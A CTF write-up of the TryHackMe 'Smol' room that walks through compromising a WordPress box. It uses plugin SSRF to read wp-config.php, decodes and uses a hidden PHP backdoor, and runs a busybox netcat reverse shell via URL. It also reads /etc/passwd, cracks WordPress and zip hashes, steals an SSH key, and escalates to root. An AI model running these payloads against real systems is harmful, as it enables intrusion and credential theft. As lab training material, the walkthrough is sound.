# Writeup for tryhackme smol room

## Enumeration

First we use nmap to enumerate the given system

**$nmap -sC -sV -p- -T4 -Pn -oN smol.nmap.log 10.10.90.229**

Which saves the enumeration result in the smol.nmap.log file. We can see that we have two open ports. 22 for ssh and 80 for http. We also have got that wordpress 6.4.3 is hosted on Apache 2.4.41 server. 

After hitting the ip we get that this ip redirects to www.smol.thm address so we need to add this as an entry in our /etc/hosts file

**$sudo vi /etc/hosts**
add below line to the host file

*Target_Machine_IP*  www.smol.thm

Now we can see that it has a website with title AnotherCTF. Now as we know this is a wordpress site we can use wpscan to look for plugins and their vulnerabilities.

**$wpscan --url http://www.smol.thm -e u,p --api-token={Your wpscan API token}**

We have foud a total of 6 vulnerabilities 4 of them are related to wordpress itself and 2 of them related to a plugin called JSmol2WP so we can deduce that we need to work with the last 2 vulnerabilities to get our flag. 

**Vulnerability 1. Unauthenticated Cross-Site Scripting (XSS)** 
[CVE-2018-20462](https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e)

**Vulnerability 2. Unauthenticated Server Side Request Forgery (SSRF)**

[CVE-2018-20463](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611)

Using SSRF we can get the wp-config.php page from where we can get the userand passwerd for wordpress login then we log into the wordpress server as wpuser. From there we can see there are two unpublished pages under pages section. We can see that under webmaster task there is a plugin called hello dolly is referenced. Now let us compare the hello dolly code from the plugin and the sever. We can see that there is an interesting entry in the hello-dolly function which called eval function let's see what is this all about.

We have found a base 64 string after decodeing we get

**if (isset($_GET["\143\155\x64"])) {system($_GET["\143\x6d\144"])}**

We can see that some kind of encoding is used to obscure the actual text. Let's explore it x64 means it is hexadecimal then 143 maybe octal 155 may also be octal let's try to convert octal to ascii and hex to ascii

**printf "\143\155\x64"**
Which outputs cmd so we can determine that this is a cmd prompt or something now about the last part
**printf "\143\x6d\144"**
Yields the same thing cmd

After a little bit of experimenting we find that we can exec os command via 

**http://www.smol.thm/wp-admin/index/php?cmd=cat /etc/passwd | grep /bin/bash**

We can see that there are 5 users who have login permission. (namely root, think, xavi, diego, gege). Now we will try to have a reverse shell. We can use [revshells.com](https://www.revshells.com) to generate our desired reverse shell. In this case I will use busybox with port 1234 and encoding as URL Encode 

The complete code is 

**http://www.smol.thm/wp-admin/index/php?cmd=busybox%20nc%2010.9.3.15%20-e%20bash**

And run netcat as nc -lvnp 1234. We have got our reverse shell as www-data user. Now we try to connect to the mysql database as wpuser with the previously found password from wp-config.php.

**$mysql -u wpuser -p 'kbL......%G' -D wordpress**

Now we will try get the password hashes from wp_users table. With 

**mysql>select * from wp_users;**

Then we save the hashes to a file and try to break it with john the ripper. We found that diego users password hash has been broken and we get the password. And try to switch to that user with 

## Login as diego

**$su - diego**

We can see that diego user has reused his password in the system too. Now we go to diego's home directory and found our first flag which is in user.txt file. Now we try to list out sudo permission for diego user but we can see that he/she can't run sudo command. Now we run id command and got that diego is a member of internal group so we know that he can see other users home directory so we try to explore other users home directory, and we found that think user has .ssh directory under his/her home directory so we get the id_rsa (i.e private key file) from that user and login as think user with the command 

## Login as think

**$ssh think@www.smol.thm -i id_rsa**

Now we try to explore permission for think but unfortunately we don't have the password of think user so we're going to explore other options that can give us access to other user. 

## Login as GEGE

During exploration we can see that there is a pam.d under /etc/ directory and there is file called su which states that if we login as gege we don't need any authentication so we switch as gege using 

**$su - gege** 

and we successfully switched to gege user. In it's home directory we found that there is a old wordpress backup so we need to get the wordpress file to our local machine. We spawn a python3 http server here.

**$python3 -m http.server 8081**

Now we can get it to our local machine by using

**$wget http://www.smol.thm:8081/wordpress.old.zip**

When attempting to unzip that it asks for a pass. So we use zip2john to generate password hash for the zip 

**$zip2john wordpress.old.zip > arc_smol.hash**

Now, attempting to break the password using john

**$john arc_smol.hash --wordlis=/usr/share/wordlists/rockyou.txt**

We get the password from here. Then we unzip it using that password. And see that there is a wp_config.php file and there is a password for xavi user. Now try to login with that user.

## Login as xavi

**$su - xavi** 

And, voila xavi also reused his password. Now we try to list his sudo permission and see that he can run sudo in all cases. So, we switch to root user using

## Login as root
**$sudo su -**

And we get the root user login to the system and we get our root flag from the root.txt file. This is the end of SMOL
